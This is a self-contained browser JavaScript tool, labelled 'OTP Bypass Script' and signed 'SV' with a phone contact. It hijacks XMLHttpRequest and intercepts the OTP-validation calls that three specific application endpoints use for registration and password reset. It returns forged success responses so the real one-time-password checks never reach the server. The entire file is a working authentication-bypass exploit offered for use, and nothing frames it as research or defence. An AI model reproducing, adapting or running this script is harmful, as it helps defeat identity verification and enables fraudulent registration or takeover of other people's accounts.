(function () {
  const notify = (msg) => alert(msg);

  notify("🧪 OTP Bypass Script Initialized by SV");

  const endpoints = [
    "/applicant-server/o/mql",
    "/server/o/mql",
    "/login-server/o/mql", // for password reset
  ];

  const fakeResponses = {
    ValidateMobileOTPForRegistration: () => ({
      ValidateMobileOTPForRegistration: {
        result: { OTPMobile: "OTPFOUND" },
        error: null,
        responseHeader: null,
        errorCode: 0,
        debugInfo: {},
        isCompressed: false,
        serverTime: new Date().toISOString(),
      },
    }),

    ValidateEmailOTPForRegistration: () => ({
      ValidateEmailOTPForRegistration: {
        result: { emailOTP: "OTPFOUND" },
        error: null,
        responseHeader: null,
        errorCode: 1000,
        debugInfo: {},
        isCompressed: false,
        serverTime: new Date().toISOString(),
      },
    }),

    dbPresentOTPValidate: () => ({
      dbPresentOTPValidate: {
        result: { user: "email@example.com" },
        error: null,
        responseHeader: null,
        errorCode: 0,
        debugInfo: {},
        isCompressed: false,
        serverTime: new Date().toISOString(),
      },
    }),

    OtpVerificationForChangingPassword: () => ({
      OtpVerificationForChangingPassword: {
        result: { resetOTP: "OTPFOUND" },
        error: null,
        responseHeader: null,
        errorCode: 1000,
        debugInfo: {},
        isCompressed: false,
        serverTime: new Date().toISOString(),
      },
    }),
  };

  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
    this._interceptUrl = url;
    return originalOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    try {
      if (typeof body === "string" && endpoints.some(ep => this._interceptUrl.includes(ep))) {
        const matchedKey = Object.keys(fakeResponses).find(key => body.includes(key));

        if (matchedKey) {
          const xhr = this;
          const fakeResponse = fakeResponses[matchedKey]();
          const fakeResponseText = JSON.stringify(fakeResponse);

          notify(`✅ OTP Verified Successfully.\nThank you for using the tool.\nSV | Contact: 9921076909`);

          // Override response properties
          Object.defineProperty(xhr, 'responseText', {
            get: () => fakeResponseText
          });

          Object.defineProperty(xhr, 'response', {
            get: () => fakeResponseText
          });

          Object.defineProperty(xhr, 'status', {
            get: () => 200
          });

          Object.defineProperty(xhr, 'readyState', {
            get: () => 4
          });

          // Simulate async readyState change
          setTimeout(() => {
            if (typeof xhr.onreadystatechange === 'function') {
              xhr.onreadystatechange();
            }
          }, 0);

          return; // Prevent actual request from sending
        }
      }
    } catch (err) {
      notify("🚫 Error during OTP bypass:\n" + err);
    }

    return originalSend.apply(this, arguments);
  };
})();
